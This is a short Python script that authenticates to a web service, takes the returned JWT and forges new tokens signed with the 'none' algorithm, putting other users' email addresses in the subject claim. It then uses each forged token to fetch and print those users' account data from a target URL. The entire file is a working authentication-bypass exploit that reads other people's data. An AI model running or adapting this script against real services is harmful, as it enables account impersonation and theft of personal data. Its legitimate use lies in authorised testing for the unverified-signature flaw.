import requests
import json
from pathlib import Path
import jwt

file_dir_path = Path(__file__).resolve().parent

# Load configurations from config.json
with open(file_dir_path / "config.json", "r") as config_file:
    config = json.load(config_file)


for login in config["logins"]:
    data = {
        "email":login["email"],
        "password":login["password"]
        }
    response = requests.post(config["login_url"], json=data)
    if response.status_code == 200:
        jwt_token = response.json().get("token")
        if jwt_token:
            print("JWT token obtained successfully.")
            print("JWT token:", jwt_token)
        else:
            print("JWT token not found in response.")
    else:
        print("Authentication failed. Status code:", response.status_code)
    headers = {
        "Authorization": f"Bearer {jwt_token}",
        "Content-Type": "application/json"
    }

    response = requests.get(url=config["target_url"], headers=headers)
    response_data = response.json()
    print(response_data["id"], response_data["email"])

    
    decoded_token = jwt.decode(jwt_token, options={"verify_signature": False})
    for email in config["emails"]:
        decoded_token["sub"] = email
        new_jwt_token = jwt.encode(decoded_token, key='', algorithm='none')

        new_headers = {
            "Authorization": f"Bearer {new_jwt_token}",
            "Content-Type": "application/json"
        }
        response = requests.get(url=config["target_url"], headers=new_headers)
        if response.status_code == 200:
            response_data = response.json()
            print("Found user data:")
            for key, value in response_data.items():
                print(f"{key, value}")
        else:
            print(f"invalid email {email}")
